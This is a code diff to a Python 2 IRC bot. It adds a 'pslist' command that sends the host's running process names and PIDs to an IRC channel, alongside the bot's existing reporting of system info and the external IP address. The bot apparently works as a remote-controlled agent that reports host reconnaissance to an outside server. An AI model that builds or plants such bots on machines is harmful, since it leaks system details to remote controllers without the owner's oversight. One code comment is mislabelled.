@@ -12,6 +12,7 @@ import os # System calls
 import platform # System info gathering
 import locale # System language
 import urllib2 # Used to get external ip address
+import psutil # List processes
 
 # Global variables to configure the bot        
 server = sys.argv[1]  # Server
@@ -66,6 +67,9 @@ def get_external_ip(): # Function to get external ip address
     print 'There was a problem with the URL: ' + e
     sendmsg(channel, 'There was a problem with the URL: ' + e)
 
+def pslist(): # Function to list process names and pids
+  for proc in psutil.process_iter():
+    sendmsg(channel, 'PID: ' + str(proc.pid) + ' | NAME: ' + proc.name)
 
 def sendmsg(chan , msg): # Function to send messages to the channel
   ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')
@@ -108,6 +112,9 @@ def main():
 
     if ircmsg.find(':getip '+ botnick) != -1: # Calls get_external_ip() if 'getip BotName' is found
       get_external_ip()
+
+    if ircmsg.find(':pslist '+ botnick) != -1: # Calls pslist() if 'getip BotName' is found
+      pslist()
 
 if __name__ == '__main__':
   if len(sys.argv) != 5:  
